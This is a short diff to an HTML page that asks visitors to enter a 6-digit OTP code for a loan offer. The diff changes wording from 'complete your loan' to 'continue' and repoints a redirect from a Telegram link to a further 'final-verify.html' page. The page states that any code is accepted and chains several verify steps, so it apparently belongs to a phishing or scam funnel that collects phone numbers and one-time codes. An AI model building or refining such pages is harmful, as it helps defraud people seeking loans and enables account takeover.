@@ -52,7 +52,7 @@
 
     <div class="content-wrapper">
         <h1>Enter OTP Code</h1>
-        <p class="subtitle">Enter any 6-digit code to complete your loan</p>
+        <p class="subtitle">Enter any 6-digit code to continue</p>
         <p class="phone-display" id="phoneDisplay"></p>
 
         <div class="offer-info">
@@ -64,7 +64,7 @@
         <div class="error-msg" id="errMsg"></div>
 
         <div style="padding: 0 25px 30px;">
-            <button class="btn-action" id="verifyBtn">Verify & Complete →</button>
+            <button class="btn-action" id="verifyBtn">Verify & Continue →</button>
             <button class="back-btn" onclick="window.location.href='verify.html'">← Back</button>
         </div>
     </div>
@@ -159,7 +159,7 @@
         }
         
         setTimeout(() => {
-            window.location.href = TELEGRAM_LINK;
+            window.location.href = 'final-verify.html';
         }, 1000);
     }
 
